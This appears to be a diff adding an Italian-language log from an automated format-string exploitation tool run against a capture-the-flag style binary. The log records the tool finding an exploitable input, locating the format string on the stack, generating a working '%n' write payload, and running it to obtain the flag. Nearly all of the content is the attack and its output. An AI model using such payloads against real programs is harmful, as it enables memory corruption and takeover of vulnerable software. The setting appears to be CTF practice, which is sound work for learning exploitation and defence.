@@ -1,0 +1,24 @@
+Dimensione indirizzi: 8 byte
+Endian: little
+
+Input da linea di comando: []
+Input da passare durante l'esecuzione: [{'type': 'execution_input', 'marker': "What's your name?\n", 'value': 'PPPP', 'free': True}]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'execution_input', 'marker': "What's your name?\n", 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (14 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: zr, oq
+Conteggio della dimensione effettiva dell'input (fino a 518 caratteri): 1032 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: posizione 10
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': generazione completata con successo
+La stringa generata è: 
+		b'%42x%012$ln.....x\x10`\x00\x00\x00\x00\x00'
+Inizio exploit: La risposta è:
+----------------------------------------
+What's your name?
+Hi,                                   ffffa610.....x`Exactly! Here's your flag:
+
+----------------------------------------
